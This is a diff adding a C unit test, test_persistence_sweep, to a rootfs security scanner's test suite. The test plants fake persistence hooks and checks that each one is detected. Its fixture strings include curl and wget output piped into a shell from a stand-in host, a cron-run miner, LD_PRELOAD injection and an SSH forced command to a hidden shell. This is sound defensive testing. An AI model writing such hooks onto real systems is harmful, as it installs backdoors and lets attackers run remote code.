@@ -217,6 +217,45 @@ static void test_merged_usr_not_doubled(void) {
     TEST_PASS("test_merged_usr_not_doubled");
 }
 
+static void test_persistence_sweep(void) {
+    TEST_START("test_persistence_sweep");
+    make_root();
+    write_file("/etc/systemd/system/evil.service", "[Service]\nExecStart=/tmp/.x/kworker --daemon\n");
+    write_file("/usr/lib/systemd/system/fetch.service",
+               "[Service]\nExecStartPre=-/usr/bin/curl -s http://x/a | /bin/bash\n");
+    write_file("/usr/lib/systemd/system/ok.service",
+               "[Service]\nExecStart=/usr/sbin/tmpwatch /tmp\nPrivateTmp=yes\n");
+    write_file("/etc/cron.d/job", "SHELL=/bin/sh\n*/5 * * * * root /dev/shm/miner\n0 1 * * * root /usr/bin/find /tmp -delete\n");
+    write_file("/etc/rc.local", "wget -qO- http://x/s | sh\n");
+    write_file("/etc/profile.d/ok.sh", ". \"$HOME/.cargo/env\"\nexport TMPDIR=/tmp\n");
+    write_file("/root/.bashrc", "LD_PRELOAD=/usr/lib/libx.so\n");
+    write_file("/home/alice/.profile", "/var/tmp/agent &\n");
+    write_file("/home/alice/.ssh/authorized_keys",
+               "command=\"/tmp/.b/sh\" ssh-ed25519 AAAA/tmp+key alice\nssh-ed25519 AAAA/./base64 bob\n");
+
+    preload_scan_result_t res;
+    booto_error_t err = preload_scan_rootfs(g_root, &res);
+    remove_tree();
+
+    ASSERT_INT_EQ(err, BOOTO_OK, "Scan must return BOOTO_OK");
+    static const char *const want[][2] = {
+        { "PERSIST_SYSTEMD_EXEC", "/tmp/.x/kworker" }, { "PERSIST_SYSTEMD_EXEC", "/usr/bin/curl" },
+        { "PERSIST_CRON", "/dev/shm/miner" },          { "PERSIST_CRON", "" },
+        { "PERSIST_SHELL_PROFILE", "/usr/lib/libx.so" }, { "PERSIST_SHELL_PROFILE", "/var/tmp/agent" },
+        { "PERSIST_SSH_FORCED_COMMAND", "/tmp/.b/sh" },
+    };
+    ASSERT_INT_EQ(res.threats_detected, 7, "One finding per planted hook; vendor /tmp args, dotfiles and key base64 are fine");
+    for (size_t w = 0; w < sizeof(want) / sizeof(want[0]); w++) {
+        bool found = false;
+        for (int i = 0; i < res.threats_detected; i++)
+            found |= strcmp(res.findings[i].rule_id, want[w][0]) == 0 &&
+                     strcmp(res.findings[i].target_library, want[w][1]) == 0;
+        if (!found) printf("missing %s %s\n", want[w][0], want[w][1]);
+        ASSERT_TRUE(found, "Expected hook reported with the program it runs");
+    }
+    TEST_PASS("test_persistence_sweep");
+}
+
 int main(void) {
     printf("\n--- Running LD_PRELOAD & PAM Interceptor Tests ---\n");
     test_ld_preload_detection();
@@ -227,6 +266,7 @@ int main(void) {
     test_modprobe_install_hook();
     test_udev_run_hook();
     test_merged_usr_not_doubled();
+    test_persistence_sweep();
     TEST_SUMMARY();
     return 0;
 }
